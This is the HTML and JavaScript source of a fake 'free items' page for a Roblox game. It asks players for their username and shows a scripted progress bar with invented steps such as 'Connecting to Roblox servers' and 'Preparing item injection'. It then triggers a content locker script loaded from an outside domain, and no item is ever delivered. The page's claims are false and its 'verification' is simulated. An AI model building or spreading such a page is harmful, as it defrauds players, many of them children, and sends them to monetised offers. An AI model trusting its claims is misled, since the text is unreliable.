<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <link rel="icon" type="image/png" href="https://i.ibb.co/6RLPJ7W3/Site-logo.png">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steal a Brainrot Roblox</title>
    <!-- Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Load Font Awesome for Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    
    <!-- Load Google Font (Inter) -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    
    <!--
      PASTE YOUR CONTENT LOCKER SCRIPT HERE
      This script should provide the `og_load()` function
      that will be called to trigger the locker.
    -->
    <script type="text/javascript" id="ogjs" src="https://execmods.com/cl/js/n624gv"></script>
    
    <script>
        // Custom Tailwind Configuration
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        'inter': ['Inter', 'sans-serif'],
                    },
                    colors: {
                        'brand-green-custom': '#24c131', /* Your custom green */
                        'brand-red-custom': '#b70321',   /* Your custom red */
                        'brand-black-custom': '#000000', /* Your custom black */
                        'brand-green': '#10b981', // Emerald 500 (for progress bar, etc.)
                        'brand-green-hover': '#059669', // Emerald 600
                        'brand-gray': {
                            800: '#1f2937', // Gray 800 (for modals, etc.)
                            900: '#111827', // Gray 900
                        }
                    },
                    animation: {
                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
                    }
                },
            },
        }
    </script>
    <style>
        /* Basic scrollbar styling for aesthetics */
        ::-webkit-scrollbar {
            width: 6px;
        }
        ::-webkit-scrollbar-track {
            background: #1f2937; /* brand-gray-800 */
        }
        ::-webkit-scrollbar-thumb {
            background: #374151; /* gray-700 */
            border-radius: 3px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #4b5563; /* gray-600 */
        }
        /* Style for disabled button */
        button:disabled {
            cursor: not-allowed;
        }

        /* Ensure html is full height and body can grow */
        html {
            height: 100%;
        }
        
        body {
            margin: 0;
            padding: 0;
            overflow-x: hidden; /* Prevent horizontal scroll */
            /* We use min-h-screen (in class) instead of height: 100% to allow scrolling */
        }

        /* Background for the whole page */
        body {
            background-image: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.8)), url('https://i.ibb.co/r2cfmnQB/ll.jpg'); /* Placeholder image */
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }
        
        /* Helper for grid pattern overlay */
        .grid-pattern-overlay::before {
            content: '';
            position: absolute;
            inset: 0;
            background-image: linear-gradient(to right, rgba(255,255,255,0.05) 1px, transparent 1px),
                              linear-gradient(to bottom, rgba(255,255,255,0.05) 1px, transparent 1px);
            background-size: 8px 8px; /* Size of the small squares */
            z-index: 0; /* Behind content */
        }

        /* Apply specific background colors to new containers */
        #green-header-container {
            background-color: #24c131; /* Your custom green */
            position: relative;
            overflow: hidden; /* Contain the pattern */
        }
        #red-items-container {
            background-color: #b70321; /* Your custom red */
            position: relative;
            overflow: hidden; /* Contain the pattern */
        }
        .item-card-background {
            background-color: #000000; /* Your custom black for item cards */
        }
        
        /* Ensure content is above the grid pattern */
        .content-above-pattern {
            position: relative;
            z-index: 10;
        }
    </style>
</head>
<body class="text-gray-200 font-inter antialiased flex flex-col min-h-screen">

    <!-- Green Header Container -->
    <div id="green-header-container" class="w-full flex-shrink-0 grid-pattern-overlay">
        <header class="container mx-auto max-w-6xl px-4 py-8 text-center text-white content-above-pattern">
            <h1 class="text-3xl sm:text-4xl md:text-5xl font-extrabold mb-3">
                Steal a Brainrot
            </h1>
            <p class="text-lg md:text-2xl font-bold mb-6 animate-pulse-slow">
                Claim items in just 20 sec!
            </p>
            
            <!-- Button Row -->
            <div class="flex flex-col sm:flex-row items-center justify-center gap-4">
                <!-- "How It Works" Button -->
                <button id="how-it-works-btn" class="w-full sm:w-auto bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg shadow-lg transition-all duration-200 transform hover:scale-105">
                    <i class="fas fa-question-circle mr-2"></i>
                    How It Works!
                </button>
                
                <!-- Share Buttons -->
                <div class="flex items-center justify-center gap-3 sm:gap-4 p-3 bg-black bg-opacity-30 rounded-lg shadow-inner">
                    <span class="text-sm font-medium text-gray-200 hidden sm:block">Share:</span>
                    <a href="https://www.facebook.com/sharer/sharer.php?u=https://stealabrainrotroblox.vercel.app" target="_blank" class="text-3xl md:text-2xl text-gray-200 hover:text-blue-500 transition-colors" aria-label="Share on Facebook">
                        <i class="fab fa-facebook-square"></i>
                    </a>
                    <a href="https://api.whatsapp.com/send?text=Check%20this%20out!%20https://stealabrainrotroblox.vercel.app" target="_blank" class="text-3xl md:text-2xl text-gray-200 hover:text-green-500 transition-colors" aria-label="Share on WhatsApp">
                        <i class="fab fa-whatsapp-square"></i>
                    </a>
                    <a href="https://t.me/share/url?url=https://stealabrainrotroblox.vercel.app&text=Check%20this%20out!" target="_blank" class="text-3xl md:text-2xl text-gray-200 hover:text-blue-400 transition-colors" aria-label="Share on Telegram">
                        <i class="fab fa-telegram"></i>
                    </a>
                </div>
            </div>
        </header>
    </div>

    <!-- Red Items Container -->
    <main id="red-items-container" class="flex-grow w-full py-8 grid-pattern-overlay">
        <div id="item-grid" class="container mx-auto max-w-6xl px-4 grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4 md:gap-6 content-above-pattern">
            <!-- Item cards will be injected here by JavaScript -->
        </div>
    </main>

    <!-- Footer -->
    <footer class="w-full flex-shrink-0 bg-black bg-opacity-50 py-6 text-center text-gray-300 text-sm">
        <p>&copy; 2025 stealabrainrotroblox.vercel.app. All rights reserved.</p>
        <p class="text-xs mt-1 text-gray-400">This website is not affiliated with Roblox Corporation.</p>
    </footer>

    <!-- Audio Player (Hidden) -->
    <audio id="item-sound-player" src=""></audio>

    <!-- 
    ====================================================================
    MODALS (Popups)
    ====================================================================
    -->

    <!-- "How It Works" Tutorial Modal -->
    <div id="tutorial-modal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4 hidden transition-opacity duration-300">
        <div class="bg-brand-gray-800 p-6 rounded-lg shadow-2xl w-full max-w-lg mx-auto relative border border-gray-700">
            <button id="close-tutorial-btn" class="absolute top-3 right-4 text-gray-400 hover:text-white text-3xl font-bold" aria-label="Close tutorial">&times;</button>
            <h2 class="text-2xl font-bold text-white mb-4">How It Works!</h2>
            <div class="text-gray-300 space-y-3">
                <p>Follow these simple steps to claim your items:</p>
                <ul class="list-decimal list-inside space-y-2 pl-2">
                    <!-- TODO: Add your tutorial steps here -->
                    <li><strong>Step 1:</strong> Browse the items and click "Claim" on the one you want.</li>
                    <li><strong>Step 2:</strong> Enter your Roblox username in the popup.</li>
                    <li><strong>Step 3:</strong> Wait for the verification process to complete.</li>
                    <li><strong>Step 4:</strong> Click the final "Continue" button to complete the human verification step.</li>
                    <li><strong>Step 5:</strong> Enjoy your new item in your account!</li>
                </ul>
            </div>
        </div>
    </div>

    <!-- Roblox Username Input Modal -->
    <div id="username-modal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4 hidden transition-opacity duration-300">
        <div class="bg-brand-gray-800 p-6 rounded-lg shadow-2xl w-full max-w-md mx-auto relative border border-gray-700 text-center">
            <button id="close-username-btn" class="absolute top-3 right-4 text-gray-400 hover:text-white text-3xl font-bold" aria-label="Close username input">&times;</button>
            <h2 class="text-2xl font-bold text-white mb-4">Enter Roblox Username</h2>
            
            <!-- Selected Item Display -->
            <div id="selected-item-display" class="mb-4 bg-brand-gray-900 p-4 rounded-lg shadow-inner">
                <!-- Selected item info will be injected here -->
            </div>

            <form id="username-form">
                <div class="mb-4">
                    <label for="roblox-username" class="block text-sm font-medium text-gray-300 mb-2">Username</label>
                    <input type="text" id="roblox-username" name="roblox-username" class="w-full px-4 py-3 bg-brand-gray-900 text-white border border-gray-700 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-brand-green focus:border-transparent" placeholder="Enter your Roblox username" required>
                </div>
                <button id="username-submit-btn" type="submit" class="w-full bg-brand-green hover:bg-brand-green-hover text-white font-bold py-3 px-6 rounded-lg shadow-lg transition-all duration-200 transform hover:scale-105 disabled:opacity-50 disabled:hover:scale-100" disabled>
                    Continue
                </button>
            </form>
        </div>
    </div>

    <!-- Progress Bar Modal -->
    <div id="progress-modal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4 hidden transition-opacity duration-300">
        <div class="bg-brand-gray-800 p-8 rounded-lg shadow-2xl w-full max-w-md mx-auto relative border border-gray-700 text-center">
            <h2 class="text-2xl font-bold text-white mb-6">Processing Your Claim...</h2>
            
            <div class="w-full bg-brand-gray-900 rounded-full h-6 mb-4 shadow-inner overflow-hidden">
                <div id="progress-bar" class="bg-brand-green h-6 rounded-full text-xs font-medium text-white text-center p-0.5 leading-none transition-all duration-500 ease-out" style="width: 0%">
                    <span id="progress-bar-text">0%</span>
                </div>
            </div>
            
            <p id="progress-status" class="text-gray-300 mb-6 h-6">Initializing...</p>

            <button id="final-continue-btn" class="w-full bg-brand-green hover:bg-brand-green-hover text-white font-bold py-3 px-6 rounded-lg shadow-lg transition-all duration-200 transform hover:scale-105 hidden">
                Continue
            </button>
        </div>
    </div>
    
    <!-- 
      Locker Container (Fallback)
      If `og_load()` fails, we can show a message here.
      By default, `og_load()` should open its own overlay.
    -->
    <div id="locker-container" class="fixed inset-0 z-[999] hidden bg-white">
        <!-- The content locker (og_load) should ideally create its own full-screen iframe -->
    </div>


    <!-- Main Application JavaScript -->
    <script type="module">
        // TODO: Update the 'sound' property for each item.
        // - Add the path to your sound file (e.g., "sounds/your-file.mp3").
        // - Make sure you have uploaded these files to your 'sounds' folder on GitHub.
        // - I have used your example for "Meowl".
        // Data for the items (from your CSV)
        const items = [
            { "name": "Meowl", "type": "OG", "image": "https://i.ibb.co/mVChL7XL/Clear-background-clear-meowl-image.webp", "sound": "sounds/Meowlsound.mp3.mpeg" },
            { "name": "Strawberry Elephant", "type": "OG", "image": "https://i.ibb.co/1t9RSRDr/Strawberryelephant.webp", "sound": "sounds/Strawberry_Elephanta.mp3.mpeg" },
            { "name": "Los Matteos", "type": "Secret", "image": "https://i.ibb.co/7J9GxycS/Los-Matteos.webp", "sound": "sounds/Losmatteos.mp3.mpeg" },
            { "name": "Bisonte Giuppitere", "type": "Secret", "image": "https://i.ibb.co/Kp6NBfjm/Bisonte-Giuppitere-normal.webp", "sound": "sounds/Bisontegiupitere.mp3.mpeg" },
            { "name": "La Vacca Saturno Saturnita", "type": "Secret", "image": "https://i.ibb.co/TxfLByZ7/La-Vaccca-Saturno-Saturnita.webp", "sound": "sounds/Lavacasaturnosaturnita.mp3.mpeg" },
            { "name": "1x1x1x1", "type": "Secret", "image": "https://i.ibb.co/pBqBwtK5/1x1x1x1t.webp", "sound": "sounds/1â´.mp3.mpeg" },
            { "name": "Guest 666", "type": "Secret", "image": "https://i.ibb.co/KpLxSTyM/Guest666t.webp", "sound": "sounds/Guest 666.mp3.mpeg" },
            { "name": "Horegini Boom", "type": "Secret", "image": "https://i.ibb.co/Pv6C3SPB/Hboom.webp", "sound": "sounds/HoreginiBoomsound.mp3.mpeg" }
            // Add more items here (with 'sound' property)
        ];

        // State
        let selectedItem = null;
        let progressInterval = null;

        // DOM Elements
        const itemGrid = document.getElementById('item-grid');
        
        const howItWorksBtn = document.getElementById('how-it-works-btn');
        const tutorialModal = document.getElementById('tutorial-modal');
        const closeTutorialBtn = document.getElementById('close-tutorial-btn');
        
        const usernameModal = document.getElementById('username-modal');
        const closeUsernameBtn = document.getElementById('close-username-btn');
        const selectedItemDisplay = document.getElementById('selected-item-display');
        const usernameForm = document.getElementById('username-form');
        const robloxUsernameInput = document.getElementById('roblox-username');
        const usernameSubmitBtn = document.getElementById('username-submit-btn');

        const progressModal = document.getElementById('progress-modal');
        const progressBar = document.getElementById('progress-bar');
        const progressBarText = document.getElementById('progress-bar-text');
        const progressStatus = document.getElementById('progress-status');
        const finalContinueBtn = document.getElementById('final-continue-btn');
        
        const lockerContainer = document.getElementById('locker-container');

        // Helper functions to show/hide modals
        const showModal = (modal) => modal.classList.remove('hidden');
        const hideModal = (modal) => modal.classList.add('hidden');

        // Function to render item cards
        function renderItems() {
            if (!itemGrid) return;
            itemGrid.innerHTML = items.map(item => `
                <div class="item-card-background rounded-lg p-4 flex flex-col items-center text-center shadow-lg transition-all duration-300 transform hover:scale-105 hover:shadow-xl border border-gray-700/50">
                    <img src="${item.image}" alt="${item.name}" 
                         class="w-24 h-24 md:w-32 md:h-32 object-contain mb-4" 
                         onerror="this.src='https://placehold.co/128x128/1f2937/7ca1ff?text=No+Img'; this.onerror=null;">
                    <h3 class="font-bold text-sm md:text-lg text-white mb-1 truncate w-full" title="${item.name}">${item.name}</h3>
                    <span class="text-xs font-semibold px-2.5 py-0.5 rounded-full mb-4 ${item.type === 'OG' ? 'bg-yellow-500/20 text-yellow-300' : 'bg-purple-500/20 text-purple-300'}">
                        ${item.type}
                    </span>
                    <button 
                        class="claim-btn w-full bg-brand-green hover:bg-brand-green-hover text-white font-bold py-2 px-4 rounded-lg shadow-md transition-colors duration-200"
                        data-item-name="${item.name}"
                        data-item-image="${item.image}"
                        data-item-sound="${item.sound || ''}"
                    >
                        Claim
                    </button>
                </div>
            `).join('');
        }

        // Function to open the username modal
        function openUsernameModal(itemName, itemImage) {
            selectedItem = { name: itemName, image: itemImage };
            selectedItemDisplay.innerHTML = `
                <img src="${itemImage}" alt="${itemName}" class="w-20 h-20 object-contain mx-auto mb-3" onerror="this.src='https://placehold.co/80x80/111827/7ca1ff?text=No+Img'; this.onerror=null;">
                <p class="text-lg font-semibold text-white">You are claiming:</p>
                <p class="text-xl font-bold text-brand-green">${itemName}</p>
            `;
            robloxUsernameInput.value = ''; // Clear input
            usernameSubmitBtn.disabled = true; // Disable button
            showModal(usernameModal);
            robloxUsernameInput.focus();
        }

        // Function to start the progress bar simulation
        function startProgress() {
            hideModal(usernameModal);
            showModal(progressModal);

            // Reset progress bar
            if (progressInterval) clearInterval(progressInterval);
            let progress = 0;
            progressBar.style.width = '0%';
            progressBarText.textContent = '0%';
            progressStatus.textContent = 'Initializing connection...';
            finalContinueBtn.classList.add('hidden');

            const steps = [
                { perc: 20, text: 'Connecting to Roblox servers...' },
                { perc: 45, text: `Validating user: ${robloxUsernameInput.value}...` },
                { perc: 65, text: 'Searching for item in database...' },
                { perc: 80, text: 'Preparing item injection...' },
                { perc: 95, text: 'Finalizing verification...' },
                { perc: 100, text: 'Verification Complete!' }
            ];

            let stepIndex = 0;

            progressInterval = setInterval(() => {
                // Increment progress by a small random amount
                progress += Math.floor(Math.random() * 3) + 1;
                
                if (progress >= 100) {
                    // Final step
                    progress = 100;
                    clearInterval(progressInterval);
                    progressStatus.textContent = 'Verification Complete!';
                    finalContinueBtn.classList.remove('hidden');
                } else if (stepIndex < steps.length && progress >= steps[stepIndex].perc) {
                    // Move to next status text
                    progressStatus.textContent = steps[stepIndex].text;
                    stepIndex++;
                }
                
                progressBar.style.width = `${progress}%`;
                progressBarText.textContent = `${progress}%`;

            }, 100); // Update every 100ms
        }

        // Function to call the content locker
        function callLocker() {
            console.log('Final continue clicked. Attempting to call content locker...');
            hideModal(progressModal);

            // This is the function call from your "image 3" hint
            if (typeof og_load === 'function') {
                try {
                    og_load();
                } catch (error) {
                    console.error("Error calling og_load():", error);
                    // Fallback if the function fails
                    lockerContainer.innerHTML = '<div class="p-8 text-center text-red-500">Error loading verification. Please try again.</div>';
                    lockerContainer.classList.remove('hidden');
                }
            } else {
                console.warn('`og_load` function not found. Make sure your locker script is loaded correctly.');
                // Fallback for testing
                lockerContainer.innerHTML = `
                    <div class="h-full w-full flex items-center justify-center bg-gray-900 text-white p-8">
                        <div class="text-center">
                            <h3 class="text-2xl font-bold mb-4">Locker Would Load Here</h3>
                            <p class="text-gray-400">The <code>og_load()</code> function was not found.<br>Please ensure your content locker script is added to the HTML <code>&lt;head&gt;</code>.</p>
                        </div>
                    </div>`;
                lockerContainer.classList.remove('hidden');
            }
        }

        // --- Event Listeners ---

        // Run when the document is loaded
        document.addEventListener('DOMContentLoaded', () => {
            renderItems();

            // Get the hidden audio player
            const itemSoundPlayer = document.getElementById('item-sound-player');

            // Event delegation for "Claim" buttons
            itemGrid.addEventListener('click', (e) => {
                const claimBtn = e.target.closest('.claim-btn');
                if (claimBtn) {
                    const itemName = claimBtn.dataset.itemName;
                    const itemImage = claimBtn.dataset.itemImage;
                    const itemSound = claimBtn.dataset.itemSound; // Get the sound path

                    // Play the sound if it exists
                    if (itemSound && itemSoundPlayer) {
                        itemSoundPlayer.src = itemSound;
                        itemSoundPlayer.play().catch(error => {
                            // Autoplay can be blocked. Log warning but continue.
                            console.warn("Audio play failed (this is often expected):", error.message);
                        });
                    }

                    openUsernameModal(itemName, itemImage);
                }
            });
        });

        // "How It Works" modal
        howItWorksBtn.addEventListener('click', () => showModal(tutorialModal));
        closeTutorialBtn.addEventListener('click', () => hideModal(tutorialModal));

        // Username modal
        closeUsernameBtn.addEventListener('click', () => hideModal(usernameModal));
        usernameForm.addEventListener('submit', (e) => {
            e.preventDefault();
            if (robloxUsernameInput.value.trim() !== '') {
                startProgress();
            }
        });
        
        // Enable/Disable username submit button
        robloxUsernameInput.addEventListener('input', () => {
            usernameSubmitBtn.disabled = robloxUsernameInput.value.trim() === '';
        });

        // Final "Continue" button
        finalContinueBtn.addEventListener('click', callLocker);

        // Close modals by clicking on the background overlay
        [tutorialModal, usernameModal].forEach(modal => {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    hideModal(modal);
                }
            });
        });

    </script>

    <!-- Vercel Analytics -->
    <script>
      window.va = window.va || function () { (window.va.q = window.va.q || []).push(arguments); };
    </script>
    <script src="/_vercel/insights/script.js" defer></script>
    <!-- End Vercel Analytics -->

    <!-- Vercel Speed Insights -->
    <script>
      window.si = window.si || function () { (window.siq = window.siq || []).push(arguments); };
    </script>
    <script src="/_vercel/speed-insights/script.js"></script>
    <!-- End Vercel Speed Insights -->

</body>
</html>

